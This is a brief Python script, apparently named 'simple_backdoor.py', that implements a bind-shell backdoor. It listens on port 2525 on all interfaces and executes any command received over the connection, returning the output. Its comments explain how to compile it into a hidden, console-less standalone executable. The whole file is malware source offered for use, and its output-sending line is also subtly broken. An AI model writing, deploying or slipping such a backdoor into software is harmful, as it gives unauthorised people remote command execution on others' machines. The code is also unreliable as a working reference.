#!/usr/bin/env python3
from socket import socket, AF_INET, SOCK_STREAM
from subprocess import run, PIPE
from os import _exit

# pip install -U nuitka
# nuitka3 simple_backdoor.py --standalone
# or 
# pyinstaller --onefile --noconsole simple_backdoor.py

def main():
	with socket(AF_INET, SOCK_STREAM) as soc:
		soc.bind(("0.0.0.0", 2525))
		soc.listen(5)
		conn, _ = soc.accept()
		while True:
			cmd = conn.recv(1024).decode("utf-8").strip()
			cmd_output = run(cmd.split(), stdout=PIPE, stderr=PIPE)
			if cmd_output.returncode == 0:
				conn.send(bytes(cmd_output.stdout, "utf-8"))
main()